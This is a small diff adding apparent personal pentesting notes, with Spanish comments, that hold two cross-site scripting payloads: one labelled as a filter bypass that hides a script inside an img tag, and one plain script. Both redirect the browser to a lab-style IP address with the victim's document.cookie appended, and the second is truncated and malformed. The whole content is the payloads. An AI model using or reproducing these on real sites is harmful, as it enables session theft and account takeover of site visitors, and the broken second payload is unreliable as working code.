@@ -1,0 +1,3 @@
+# Con burlacion en caso de que haya reglas en scripts <img src="test><script>document.location("http://10.10.14.35/?cookie=' + document.cookie + '")</script>">
+# Normal
+<script>document.location("http://10.10.14.35/?cookie=)</script>
